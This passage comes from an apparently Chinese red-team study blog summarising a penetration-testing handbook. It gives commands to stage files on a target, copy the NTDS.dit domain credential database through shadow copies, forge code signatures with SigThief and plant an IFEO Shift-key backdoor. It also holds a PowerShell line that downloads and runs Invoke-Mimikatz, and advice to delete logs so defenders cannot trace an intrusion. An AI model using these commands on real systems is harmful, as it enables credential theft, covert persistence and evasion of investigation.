<span class="hljs-comment">--template &lt;path&gt; 指定一个 executable 文件作为模板</span>-k, <span class="hljs-comment">--keep payload自动分离并注入到新的进程</span>-o, <span class="hljs-comment">--out &lt;path&gt; 存放生成的payload</span>-v, <span class="hljs-comment">--var-name &lt;name&gt; 指定自定义变量</span><span class="hljs-comment">--smallest Generate the smallest possible payload</span>-h, <span class="hljs-comment">--help 显示帮助文件</span></code></pre><pre><code class="hljs css"><span class="hljs-selector-tag">https</span>://<span class="hljs-selector-tag">www</span><span class="hljs-selector-class">.kanxue</span><span class="hljs-selector-class">.com</span>/<span class="hljs-selector-tag">book-38-445</span><span class="hljs-selector-class">.htm</span>   高级渗透第十课</code></pre><hr><h2 id="8-6-windows环境压缩文件-amp-文件夹命令合集"><a href="#8-6-windows环境压缩文件-amp-文件夹命令合集" class="headerlink" title="8.6 windows环境压缩文件&amp;文件夹命令合集"></a>8.6 windows环境压缩文件&amp;文件夹命令合集</h2><p>本篇文章会介绍几种常用的 windows打包、压缩文件&amp;文件夹的方法。</p><p><strong>压缩工具 Winrar</strong></p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/u2s1/</span>winrarsc</code></pre><p>实际使用情况,直接把 Winrar.exe上传至目标机即可, Winrar大约400k。</p><p>常用压缩命令为 :</p><pre><code class="hljs stylus">C:\RECYCLER\Winrar<span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">a</span> -k -r -s -m5 tmp<span class="hljs-selector-class">.rar</span> srcdir</code></pre><p>常用解压命令为：</p><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\R</span>ECYCLER<span class="hljs-symbol">\W</span>inrar.exe x -t -o -p d:<span class="hljs-symbol">\w</span>eb.rar d:<span class="hljs-symbol">\d</span>esdirdesdir文件夹需存在</code></pre><hr><p><strong>压缩工具7za</strong></p><pre><code class="hljs avrasm"><span class="hljs-symbol">https:</span>//www<span class="hljs-number">.7</span>-zip<span class="hljs-meta">.org</span>   --官网</code></pre><p>7za常用命令<br>查看压缩文件内容(如判断目标机上压缩文件是否有价值)</p><pre><code class="hljs aspectj"><span class="hljs-number">7</span>za l <span class="hljs-keyword">target</span>.zip</code></pre><p>常用压缩命令如下</p><p>按照默认压缩类型进行压缩,7za会自动遍历所压缩文件夹内的子文件、子文件夹，默认压缩类型为7z即参数-a -t7z，其中-mx9为7z模式中UItra compressing</p><pre><code class="hljs apache"><span class="hljs-attribute">7za</span> a -mx=<span class="hljs-number">9</span> archive<span class="hljs-number">1</span>.zip test</code></pre><p>如果需要使用其他压缩类型，如zip</p><pre><code class="hljs stata">7za a -tzip archive1.<span class="hljs-keyword">zip</span> <span class="hljs-keyword">test</span></code></pre><p>常用解压缩命令如下，too文件夹7za自动创建。</p><pre><code class="hljs taggerscript">7za x tmp.7z c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\t</span>emp<span class="hljs-symbol">\t</span>ool</code></pre><p>或者压缩文件、文件夹时，需排除某些文件夹，不压缩上面-x 后面的文件夹内文件，文件夹名有空格需用双引号引起来，命令如下</p><p>排除文件</p><pre><code class="hljs apache"><span class="hljs-attribute">7za</span> a archive<span class="hljs-number">1</span>.zip test -x!treeNMS-<span class="hljs-number">1</span>.<span class="hljs-number">7</span>.<span class="hljs-number">4</span>.zip</code></pre><p>排除文件夹</p><pre><code class="hljs stata">7za a archive1.<span class="hljs-keyword">zip</span> <span class="hljs-keyword">test</span> -xr!serverbak</code></pre><hr><p><strong>使用 windows自带压缩文件命令</strong></p><p><strong>makecab压缩文件命令</strong></p><pre><code class="hljs awk">https:<span class="hljs-regexp">//my</span>.oschina.net<span class="hljs-regexp">/hkmax/</span>blog/<span class="hljs-number">144293</span>   --makecab 方法</code></pre><p>makecab可压缩单个文件或多个文件,但无法压缩文件夹压缩单个文件命令为</p><pre><code class="hljs apache"><span class="hljs-attribute">makecab</span> <span class="hljs-number">1</span>. txt <span class="hljs-number">1</span>.zip</code></pre><p><strong>expand解压缩命令</strong></p><p>解压缩test1.cab至c:\windows\temp\tool目录，tool目录必须存在</p><pre><code class="hljs taggerscript">expand D:<span class="hljs-symbol">\d</span>ayu<span class="hljs-symbol">\t</span>est1.cab -f:* c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\t</span>emp<span class="hljs-symbol">\t</span>ool</code></pre><p><strong>zip.vbs解压方法</strong></p><p>windows文件管理器自带压缩、解压缩功能( zipped)，属于explorer的功能，无法命令行调用，具体介绍传送门( <a href="https://filext.com/faq/compressed_zip_folder.html)%EF%BC%8C%E6%AD%A4%E5%A4%84zip.vbs%E4%B8%BA%E8%B0%83%E7%94%A8COM%E6%8E%A5%E5%8F%A3%E4%BB%8E%E8%80%8C%E8%B0%83%E7%94%A8%E8%87%AA%E5%B8%A6%E7%9A%84">https://filext.com/faq/compressed_zip_folder.html)，此处zip.vbs为调用COM接口从而调用自带的</a> explorer zip</p><p>压缩文件命令为</p><pre><code class="hljs stata"><span class="hljs-keyword">CScript</span> <span class="hljs-keyword">zip</span>.vbs C:\<span class="hljs-keyword">test</span> C:\target.<span class="hljs-keyword">zip</span></code></pre><p><strong>powershell缩文件夹</strong></p><p>将文件或文件夹test压缩为test.zip</p><pre><code class="hljs mathematica"><span class="hljs-variable">powershell</span> <span class="hljs-built_in">Compress</span><span class="hljs-operator">-</span><span class="hljs-variable">Archive</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Path</span> <span class="hljs-built_in">D</span><span class="hljs-operator">:</span>\<span class="hljs-variable">test</span> <span class="hljs-operator">-</span><span class="hljs-variable">DestinationPath</span> <span class="hljs-built_in">E</span><span class="hljs-operator">:</span>\<span class="hljs-variable">test</span><span class="hljs-operator">.</span><span class="hljs-variable">zip</span></code></pre><p>将文件test.zip解压到test目录下</p><pre><code class="hljs stata">powershell <span class="hljs-keyword">Expand</span>-Archive -Path <span class="hljs-keyword">E</span>:\<span class="hljs-keyword">test</span>.<span class="hljs-keyword">zip</span> -DestinationPath F:\<span class="hljs-keyword">test</span></code></pre><hr><h2 id="8-7-Windows-net-命令集使用"><a href="#8-7-Windows-net-命令集使用" class="headerlink" title="8.7 Windows net 命令集使用"></a>8.7 Windows net 命令集使用</h2><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/iriczhao/</span>p/<span class="hljs-number">10469143</span>.htmlhttps:<span class="hljs-regexp">//</span>cloud.tencent.com<span class="hljs-regexp">/developer/</span>article/<span class="hljs-number">1459966</span>https:<span class="hljs-regexp">//</span>www.jianshu.com<span class="hljs-regexp">/p/</span>b35078a6f030</code></pre><p>认真看完知道有个概念即可！！！</p><hr><h2 id="8-8-Cobaltstrike与Metasploit实战联动"><a href="#8-8-Cobaltstrike与Metasploit实战联动" class="headerlink" title="8.8 Cobaltstrike与Metasploit实战联动"></a>8.8 Cobaltstrike与Metasploit实战联动</h2><ul><li><a href="https://my.oschina.net/u/4304822/blog/3328524">https://my.oschina.net/u/4304822/blog/3328524</a></li></ul><hr><h2 id="8-9-渗透中常用的复制工具"><a href="#8-9-渗透中常用的复制工具" class="headerlink" title="8.9 渗透中常用的复制工具"></a>8.9 渗透中常用的复制工具</h2><p>在渗透中经常需要复制像NTDS.dit、mssql数据库文件等关键文件。由于这些文件都被占用,所以不能直接复制。下面介绍几个常用的命令or工具来实现复制</p><h3 id="VSSadmin"><a href="#VSSadmin" class="headerlink" title="VSSadmin"></a><strong>VSSadmin</strong></h3><p>域环境默认安装。</p><p><strong>使用：</strong></p><p>创建卷影</p><pre><code class="hljs routeros">vssadmin create shadow /<span class="hljs-attribute">for</span>=c:</code></pre><p>获取当前卷影</p><pre><code class="hljs ebnf"><span class="hljs-attribute">vssadmin list shadow</span></code></pre><p>从卷影复制文件</p><pre><code class="hljs taggerscript">copy <span class="hljs-symbol">\\</span>?<span class="hljs-symbol">\G</span>LOBALROOT<span class="hljs-symbol">\D</span>evice<span class="hljs-symbol">\H</span>arddiskVolumeShadowCopy2<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\N</span>TDS<span class="hljs-symbol">\n</span>tds.dit c:<span class="hljs-symbol">\n</span>tds.dit</code></pre><p>删除卷影</p><pre><code class="hljs awk">vssadmin <span class="hljs-keyword">delete</span> shadows <span class="hljs-regexp">/for=c: /</span>quiet</code></pre><hr><h3 id="ntdsutil"><a href="#ntdsutil" class="headerlink" title="ntdsutil"></a><strong>ntdsutil</strong></h3><p>域环境默认安装</p><p>创建快照</p><pre><code class="hljs mel">ntdsutil <span class="hljs-keyword">snapshot</span> <span class="hljs-string">&quot;activate instance ntds&quot;</span> create <span class="hljs-keyword">quit</span> <span class="hljs-keyword">quit</span></code></pre><p>挂载快照</p><pre><code class="hljs subunit">ntdsutil snapshot &quot;mount &#123;22508acf<span class="hljs-string">-8</span>a01<span class="hljs-string">-4322</span><span class="hljs-string">-867</span>d<span class="hljs-string">-383</span>cf78f59e3&#125; quit quit快照挂载为C:\$SNAP_201912231558_V0LUMEC$\，copy ntds即可</code></pre><p>卸载快照</p><pre><code class="hljs mel">ntdsutil <span class="hljs-keyword">snapshot</span> <span class="hljs-string">&quot;unmount &#123;22508acf-8a01-4322-867d-383cf78f59e3&#125;&quot;</span> <span class="hljs-keyword">quit</span> <span class="hljs-keyword">quit</span></code></pre><p>删除快照</p><pre><code class="hljs mel">ntdsutil <span class="hljs-keyword">snapshot</span> <span class="hljs-string">&quot;delete &#123;22508acf-8a01-4322-867d-383cf78f59e3&#125;&quot;</span> create <span class="hljs-keyword">quit</span> <span class="hljs-keyword">quit</span></code></pre><hr><h3 id="Vshadow"><a href="#Vshadow" class="headerlink" title="Vshadow"></a><strong>Vshadow</strong></h3><p>不是系统默认工具，可在Microsoft SDK中获取</p><p>创建快照</p><pre><code class="hljs stylus">vshadow<span class="hljs-selector-class">.exe</span> -<span class="hljs-selector-tag">p</span> -nw C:</code></pre><p>获取快照列表</p><pre><code class="hljs css"><span class="hljs-selector-tag">vshadow</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">-q</span></code></pre><p>复制</p><pre><code class="hljs mipsasm">copy <span class="hljs-keyword">Shadow </span>copy device <span class="hljs-string">&quot;Name&quot;</span>\windows\NTDS\ntds.<span class="hljs-keyword">dit </span>c:\ntds.<span class="hljs-keyword">dit </span></code></pre><p>删除快照</p><pre><code class="hljs dust"><span class="xml">vshadow -ds=</span><span class="hljs-template-variable">&#123;ID&#125;</span></code></pre><h3 id="Ninjacopy"><a href="#Ninjacopy" class="headerlink" title="Ninjacopy"></a><strong>Ninjacopy</strong></h3><p>ninjacopy是powersploit中的一个powershell脚本直接使用 Invoke-NinjaCopy -Path &lt;需要复制的文件&gt; -LocalDestination &lt;复制文件保存位置&gt; 即可复制</p><p><strong>VolumeShadowCopyTools</strong></p><p>属于powersploit的项目，地址VolumeShadowCopyTools，之前遇到上面介绍的方法都不能复制数据库文件，使用这个工具成功复制</p><p>创建卷影</p><pre><code class="hljs dockerfile">New-VolumeShadowCopy -<span class="hljs-keyword">Volume</span><span class="bash"> C:\</span></code></pre><p>列出卷影</p><pre><code class="hljs ebnf"><span class="hljs-attribute">Get-VolumeShadowCopy</span></code></pre><p>挂载卷影</p><pre><code class="hljs taggerscript">Mount-VolumeShadowCopy -Path C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\p</span>ublic -DevicePath <span class="hljs-symbol">\\</span>?<span class="hljs-symbol">\G</span>LOBALROOT<span class="hljs-symbol">\D</span>evice<span class="hljs-symbol">\H</span>arddiskVolumeShadowCopy1   可直接在挂载点操作了</code></pre><p>卸载卷影</p><pre><code class="hljs taggerscript">Remove-VolumeShadowCopy -DevicePath <span class="hljs-symbol">\\</span>?<span class="hljs-symbol">\G</span>LOBALROOT<span class="hljs-symbol">\D</span>evice<span class="hljs-symbol">\H</span>arddiskVolumeShadowCopy1</code></pre>]]></content>
    
    
    <categories>
      
      <category>红队攻防</category>
      
    </categories>
    
    
    <tags>
      
      <tag>红队攻防</tag>
      
      <tag>渗透攻击红队百科全书</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红队攻防学习之权限维持</title>
    <link href="/p/efc8f01a.html"/>
    <url>/p/efc8f01a.html</url>
    
    <content type="html"><![CDATA[<h1 id="七、权限维持"><a href="#七、权限维持" class="headerlink" title="七、权限维持"></a>七、权限维持</h1><h2 id="7-1-操作系统后门"><a href="#7-1-操作系统后门" class="headerlink" title="7.1 操作系统后门"></a>7.1 操作系统后门</h2><h3 id="7-1-1-Linux"><a href="#7-1-1-Linux" class="headerlink" title="7.1.1 Linux"></a>7.1.1 Linux</h3><p>参考文章：<code>https://cloud.tencent.com/developer/article/1666643</code></p><hr><h3 id="7-1-2-Windows"><a href="#7-1-2-Windows" class="headerlink" title="7.1.2 Windows"></a>7.1.2 Windows</h3><h4 id="7-1-2-1-对抗权限长期把控-伪造无效签名"><a href="#7-1-2-1-对抗权限长期把控-伪造无效签名" class="headerlink" title="7.1.2.1 对抗权限长期把控-伪造无效签名"></a>7.1.2.1 对抗权限长期把控-伪造无效签名</h4><p>Github：<code>https://github.com/secretsquirrel/SigThief</code></p><p><strong>简介：</strong></p><p>在实战中，尤其是需要长期控制的目标，除免杀对抗安全软件以外，还需考虑人为无 意查看恶意文件，如数字签名是否拥有。而许多安全软件，又仅仅验证是否有签名，而非验 证签名是否有效。那么针对重要的目标，需要提前做多重对抗准备。</p><p>伪造无效签名payload：</p><pre><code class="hljs stylus">sigthief<span class="hljs-selector-class">.py</span> ‐<span class="hljs-selector-tag">i</span> 有签名的文件<span class="hljs-selector-class">.exe</span> ‐t 没签名的文件<span class="hljs-selector-class">.exe</span> ‐o 新的文件名<span class="hljs-selector-class">.exe</span></code></pre><p>许多安全软件，仅仅是验证是否有数字签名，而不确认是否有效</p><p>该原始python在伪造证书时，需要注意2点：</p><p>原始证书文件需要对应目标机的机器版本以及位数，如目标机是Windows 2003，那么需要原始带证书文件也为Windows 2003的文件。包括第三方文件。</p><p>伪造证书后，例：在Windows 2003 开启验安全验证后，双击无法运行，也无报 错，需要命令行下执行即可。</p><h4 id="7-1-2-2-常见windows持久控制总结"><a href="#7-1-2-2-常见windows持久控制总结" class="headerlink" title="7.1.2.2 常见windows持久控制总结"></a>7.1.2.2 常见windows持久控制总结</h4><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.sins7.cn<span class="hljs-regexp">/summary-of-windows-persistence-backdoor-for-intranet-penetration/</span>https:<span class="hljs-regexp">//</span>www.freebuf.com<span class="hljs-regexp">/articles/</span>system/<span class="hljs-number">229209</span>.html</code></pre><hr><h4 id="7-1-2-3-Windows-RID劫持"><a href="#7-1-2-3-Windows-RID劫持" class="headerlink" title="7.1.2.3 Windows RID劫持"></a>7.1.2.3 Windows RID劫持</h4><p>Rid_Hijack模块是一个关于后渗透阶段用来维持权限的模块…利用</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">2998</span>https:<span class="hljs-regexp">//</span>www.freebuf.com<span class="hljs-regexp">/articles/</span>system/<span class="hljs-number">169925</span>.html</code></pre><hr><h4 id="7-1-2-4-Shift映像劫持后门新玩法"><a href="#7-1-2-4-Shift映像劫持后门新玩法" class="headerlink" title="7.1.2.4 Shift映像劫持后门新玩法"></a>7.1.2.4 Shift映像劫持后门新玩法</h4><p><strong>映像劫持简介</strong></p><p>映像劫持（Image File Execution Options），简单的说法，就是当你打开的是程序A，而运行的确是程序B。</p><p>映像劫持其实是Windows内设的用来调试程序的功能，但是现在却往往被病毒恶意利用。当用户双击对应的程序后，操作系统就会给外壳程序（例如“explorer.exe”）发布相应的指令，其中包含有执行程序的路径和文件名，然后由外壳程序来执行该程序。事实上在该过程中，Windows还会在注册表的上述路径中查询所有的映像劫持子键，如果存在和该程序名称完全相同的子键，就查询对应子健中包含的“Dubugger”键值名，并用其指定的程序路径来代替原始的程序，之后执行的是遭到“劫持”的虚假程序。</p><p><strong>简单测试</strong></p><p>映像劫持技术的利用，存在已久，这里再简单说明下：修改注册表HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options下sethc.exe，添加一个Debugger字符值（REG_SZ），并且赋值为cmd.exe的执行路径为C:\windows\system32\cmd.exe</p><p>之后键入五下Shift执行sethc.exe程序时便会执行cmd.exe程序。</p><p><strong>映像劫持后门新玩法</strong></p><p>参考文章：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>zhuanlan.zhihu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">98526538</span></code></pre><hr><h4 id="7-1-2-4-windows权限维持篇-注册表维权"><a href="#7-1-2-4-windows权限维持篇-注册表维权" class="headerlink" title="7.1.2.4 windows权限维持篇-注册表维权"></a>7.1.2.4 windows权限维持篇-注册表维权</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>cloud.tencent.com<span class="hljs-regexp">/developer/</span>article/<span class="hljs-number">1553305</span>https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/xiaozi/</span>p/<span class="hljs-number">11798030</span>.html ---Window权限维持（一）：注册表运行键</code></pre><p>书上的知识点很详细的介绍了，思路很清晰！！！</p><hr><h4 id="7-1-2-5-windows权限维持篇2-计划任务维权"><a href="#7-1-2-5-windows权限维持篇2-计划任务维权" class="headerlink" title="7.1.2.5 windows权限维持篇2-计划任务维权"></a>7.1.2.5 windows权限维持篇2-计划任务维权</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/xiaozi/</span>p/<span class="hljs-number">11797078</span>.html</code></pre><p>书上的知识点很详细的介绍了，思路很清晰！！！</p><hr><h4 id="7-1-2-6-windows-权限维持篇3-服务service维权"><a href="#7-1-2-6-windows-权限维持篇3-服务service维权" class="headerlink" title="7.1.2.6 windows 权限维持篇3-服务service维权"></a>7.1.2.6 windows 权限维持篇3-服务service维权</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/xiaozi/</span>p/<span class="hljs-number">11815957</span>.html</code></pre><p>书上的知识点很详细的介绍了，思路很清晰！！！<br>介绍了命令行方式添加服务、powershell形式添加服务、SharPersist添加服务进行、Metasploit服务维权模块进行权限维持讲解！！</p><hr><h2 id="7-2-第三方组件后门"><a href="#7-2-第三方组件后门" class="headerlink" title="7.2 第三方组件后门"></a>7.2 第三方组件后门</h2><p>开始Windows也简单介绍了…</p><h3 id="7-2-1-APT对抗（一）红蓝对抗关于后门对抗"><a href="#7-2-1-APT对抗（一）红蓝对抗关于后门对抗" class="headerlink" title="7.2.1 APT对抗（一）红蓝对抗关于后门对抗"></a>7.2.1 APT对抗（一）红蓝对抗关于后门对抗</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>cloud.tencent.com<span class="hljs-regexp">/developer/</span>article/<span class="hljs-number">1497360</span></code></pre><h3 id="7-2-2-APT对抗（二）红蓝对抗关于后门对抗"><a href="#7-2-2-APT对抗（二）红蓝对抗关于后门对抗" class="headerlink" title="7.2.2 APT对抗（二）红蓝对抗关于后门对抗"></a>7.2.2 APT对抗（二）红蓝对抗关于后门对抗</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>cloud.tencent.com<span class="hljs-regexp">/developer/</span>article/<span class="hljs-number">1497361</span></code></pre><hr><h3 id="7-2-3-APT对抗（三）红蓝对抗关于后门对抗"><a href="#7-2-3-APT对抗（三）红蓝对抗关于后门对抗" class="headerlink" title="7.2.3 APT对抗（三）红蓝对抗关于后门对抗"></a>7.2.3 APT对抗（三）红蓝对抗关于后门对抗</h3><p><strong>前者的话:</strong> 从第三季开始引入段子，让本枯燥的学术文章，也变得生动有趣。第二季的Demo遵循人性五条来设计，回忆这其中五条：</p><p><strong>1、攻击方与防御方的本质是什么?</strong></p><p>增加对方的时间成本，人力成本，资源成本（不限制于服务器资源），金钱成本。</p><p><strong>2、安全公司的本质是什么?</strong></p><p>盈利、最小投入、最大产出</p><p><strong>3、安全公司产品的本质是什么?</strong></p><p>能适应大部分客户，适应市场化，并且适应大部分机器。（包括不限制于资源紧张,宽带不足等问题的客户）</p><p><strong>4、安全人员的本质是什么?</strong></p><p>赚钱，养家。买房，还房贷。导致，快速解决客户问题（无论暂时还是永久性解决），以免投诉。</p><p><strong>5、对接客户的本质是什么?</strong></p><p>对接客户也是某公司内安全工作的一员、与概念4相同。</p><p><strong>6、线索排查与反线索排查</strong></p><p>那么这个demo离可高级可持续性渗透后门还有一段距离，这里引入第六条<code>线索排查</code>与<code>反线索排查</code>,在第二季的dem中，它生成了一个名为 micropoor.的文件，如果经验丰富的安全人员可根据时间差来排查日记，demo的工作流程大致是这样的，打开 notepad++，生成 micropoor. txt，写入内容，关闭文件流。根据线索排查，定位到 notepad++，导致权限失控。</p><p>在线索排查概念中，这里要引入“ABC”类线索关联排查，当防御者在得到线索A，顺藤到B，最后排查到目标文件C，根据五条中的第一条，demo要考虑如何删除指定日志内容，以及其他操作。来阻止ABC类线索关联排查。</p><p><strong>不要思维固死在这是一个 notepad++后门的文章，它是一个面向类后门，面向的是可掌握源码编译的类后门。</strong></p><p>同样不要把思维固定死在demo中的例子，针对不同版本的NT系统，完全引用”powershell IEX(New-Object System.Net.WebClient).DownloadString(‘<a href="https://raw.githubusercontent.com/clymb3r/Powershell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1%E2%80%99);Invoke-Mimikatz&quot;%E8%80%8C%E5%85%B3%E4%BA%8Ebypass">https://raw.githubusercontent.com/clymb3r/Powershell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1’);Invoke-Mimikatz&quot;而关于bypass</a> UAC，已经有成熟的源码。或发送至远程或是写在本地的图片里，不要让知识限制了后门的想象。这也正是第一季所说的：一个优秀的 Microdot是量身目标制定且一般不具备通用性的。一般不具备通用性。</p><p>观看目前文章的一共有2类人，一类攻击方，一类防守方。假设一个场景，现在摆在你面前有一台笔记本，并且这台笔记本有明确的后门，你的任务，排查后门。我想所有人都会排查注册表，服务，端口，进程等。因为这些具备通用性，也同样具备通用性排查手段。</p><p>临近文章结尾，第三次引用：在后门的进化对抗中，rootkit发生了变化，最大的改变是它的系统层次结构发生了变化。</p><hr><h3 id="7-2-4-APT对抗（四）红蓝对抗关于后门对抗"><a href="#7-2-4-APT对抗（四）红蓝对抗关于后门对抗" class="headerlink" title="7.2.4 APT对抗（四）红蓝对抗关于后门对抗"></a>7.2.4 APT对抗（四）红蓝对抗关于后门对抗</h3><p>第四季是一个过渡季，过渡后门在对抗升级中由传统后门，衍生成锁定目标的制定后门。</p><p>引用百度百科的“后门程序”的相关解释 ：</p><pre><code class="hljs xquery">https://baike.baidu.com/<span class="hljs-type">item</span>/<span class="hljs-meta">%E5</span><span class="hljs-meta">%90</span><span class="hljs-meta">%8E</span><span class="hljs-meta">%E9</span><span class="hljs-meta">%97</span><span class="hljs-meta">%A8</span><span class="hljs-meta">%E7</span><span class="hljs-meta">%A8</span><span class="hljs-meta">%8B</span><span class="hljs-meta">%E5</span><span class="hljs-meta">%BA</span><span class="hljs-meta">%8F</span>/<span class="hljs-number">108154</span></code></pre><p>安全从业人员，其实至少一直在与传统后门对抗，比如最常见的webshell免杀与webshell过waf。应急中的样本取证查杀远控残留文件等。但是webshell，远控仅仅又是“backdoor”的其中一种。</p><p>这里按照上几季的风格继续引用几个概念，只有概念清晰，才能了解如何对抗。</p><p><strong>1：安全从业人员为什么要了解后门？</strong></p><p>防御是以市场为核心的，而不是以项目为核心。需要对抗的可能是黑产从业者的流量劫持相关后门，或者是政治黑客的高持续渗透权限把控后门等。</p><p><strong>2：攻击人员为什么要了解后门？</strong></p><p>随着对抗传统后门的产品越来越成熟，由特征查杀，到行为查杀，到态势感知。到大数据联合特征溯源锁定，如何反追踪，是一个非常值得思考的问题。</p><p><strong>3：后门与项目的关联是什么？</strong></p><p>某项目，被入侵，应急并加固解决，若干天后，再次被入侵依然篡改为某博彩。导致安全从业人员，客户之间的问题。</p><p><strong>4：后门与安全产品的关联是什么？</strong></p><p>某客户购买某安全产品套装，在实战中，一般由非重点关注服务器迂回渗透到核心服务器来跨过安全产品监控，得到相关权限后，后门起到越过安全产品。它会涉及对其他附属安全产品的影响。如客户质疑：为什么我都买了你们的套装，还被入侵。并且这还是第二次了。</p><p><strong>这里再一次引入百度百科的APT的主要特性：</strong></p><p>——潜伏性： 这些新型的攻击和威胁可能在用户环境中存在一年以上或更久，他们不断收集各种信息，直到收集到重要情报。而这些发动APT攻击的黑客目的往往不是为了在短时间内获利，而是把“被控主机”当成跳板，持续搜索，直到能彻底掌握所针对的目标人、事、物，所以这种APT攻击模式, 实质上是一种“恶意商业间谍威胁”。</p><p>——持续性： 由于APT攻击具有持续性甚至长达数年的特征，这让企业的管理人员无从察觉。在此期间，这种“持续性”体现在攻击者不断尝试的各种攻击手段，以及渗透到网络内部后长期蛰伏。</p><p>——锁定特定目标： 针对特定政府或企业，长期进行有计划性、组织性的窃取情报行为,针对被锁定对象寄送几可乱真的社交工程恶意邮件，如冒充客户的来信,取得在计算机植入恶意软件的第一个机会。</p><p>——安装远程控制工具： 攻击者建立一个类似僵尸网络Botnet的远程控制架构，攻击者会定期传送有潜在价值文件的副本给命令和控制服务器(C&amp;C Server)审查。将过滤后的敏感机密数据，利用加密的方式外传。</p><p><strong>一次针对特定对象，长期、有计划性渗透的本质是什么？</strong></p><p>窃取数据下载到本地，或者以此次渗透来达到变现目的。</p><p>一次具有针对性的渗透，绝对不单单是以渗透DMZ区为主，重要资料一般在内网服务器区（包括但不限制于数据库服务器，文件服务器，OA服务器），与内网办公区（包括但不限制于个人机，开发机，财务区）等。而往往这样的高级持续渗透，不能是一气呵成，需要一定时间内，来渗透到资料所在区域。而这里其中一个重要的环节就是对后门的要求 ，在渗透期间内（包括但不限制于一周到月甚至到年）以保持后续渗透。</p><p><strong>传统型的后门不在满足攻击者的需求，而传统型的木马后门， 大致可分为六代：</strong></p><p>第一代 ，是最原始的木马程序。主要是简单的密码窃取，通过电子邮件发送信息等，具备了木马最基本的功能。</p><p>第二代 ，在技术上有了很大的进步，冰河是中国木马的典型代表之一。</p><p>第三代 ，主要改进在数据传递技术方面，出现了ICMP等类型的木马，利用畸形报文传递数据，增加了杀毒软件查杀识别的难度。</p><p>第四代 ， 在进程隐藏方面有了很大改动，采用了内核插入式的嵌入方式，利用远程插入线程技术，嵌入DLL线程。或者挂接PSAPI，实现木马程序的隐藏，甚至在Windows NT/2000下，都达到了良好的隐藏效果。灰鸽子和蜜蜂大盗是比较出名的DLL木马。</p><p>第五代 ，驱动级木马。驱动级木马多数都使用了大量的Rootkit技术来达到在深度隐藏的效果，并深入到内核空间的，感染后针对杀毒软件和网络防火墙进行攻击，可将系统SSDT初始化，导致杀毒防火墙失去效应。有的驱动级木马可驻留BIOS，并且很难查杀。</p><p>第六代 ，随着身份认证UsbKey和杀毒软件主动防御的兴起，黏虫技术类型和特殊反显技术类型木马逐渐开始系统化。前者主要以盗取和篡改用户敏感信息为主，后者以动态口令和硬证书攻击为主。PassCopy和暗黑蜘蛛侠是这类木马的代表。</p><p>以远控举例，远控最开始生成的RAT功能一体化（包括但不限制于文件传输，命令执行等），后衍生成生成RAT支持插件式来达到最终目的。</p><p>以上的几代包括以上远控共同点，以独立服务或者独立进程，独立端口等来到达目的。难以对抗目前的反病毒反后门程序。那么传统型后门权限维持就不能满足目前的需求。</p><p>以第二季的demo举例，它无自己的进程，端口，服务，而是借助notepad++（非dll劫持）来生成php内存shell（这个过程相当于插件生成），并且无自启，当服务器重启后，继续等待管理员使用notepad++，它属于一个AB链后门，由A-notepad生成B-shell，以B-shell去完成其他工作。如果继续改进Demo，改造ABC链后门，A负责生成，B负责清理痕迹，C负责工作呢? 这是一个攻击者应该思考的问题。</p><p><strong>而后门的主要工作有2点 ：</strong></p><pre><code class="hljs plain">1、越过安全产品2、维持持续渗透权限</code></pre><p>文章的结尾，这不是一个notepad++的后门介绍，它是一个demo，一个类后门 ，一个具有源码可控类的后门</p><hr><h3 id="7-2-5-dll劫持"><a href="#7-2-5-dll劫持" class="headerlink" title="7.2.5 dll劫持"></a>7.2.5 dll劫持</h3><p>书上介绍了-两种劫持方法剖析，目前没找到实例，书上讲得很好…</p><p>另外的dll劫持：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/h2zZhou/</span>p/<span class="hljs-number">8601375</span>.htmlhttps:<span class="hljs-regexp">//</span>www.<span class="hljs-number">4</span>hou.com<span class="hljs-regexp">/posts/</span>PrJ4https:<span class="hljs-regexp">//</span>www.freebuf.com<span class="hljs-regexp">/articles/</span>system/<span class="hljs-number">227824</span>.html</code></pre><hr><h3 id="7-2-6-APT对抗-红蓝对抗关于后门对抗（五-七）"><a href="#7-2-6-APT对抗-红蓝对抗关于后门对抗（五-七）" class="headerlink" title="7.2.6 APT对抗-红蓝对抗关于后门对抗（五~七）"></a>7.2.6 APT对抗-红蓝对抗关于后门对抗（五~七）</h3><p>详情见中册502页</p>]]></content>
    
    
    <categories>
      
      <category>红队攻防</category>
      
    </categories>
    
    
    <tags>
      
      <tag>红队攻防</tag>
      
      <tag>渗透攻击红队百科全书</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红队攻防学习之权限提升</title>
    <link href="/p/ad5b2fbd.html"/>
    <url>/p/ad5b2fbd.html</url>
    
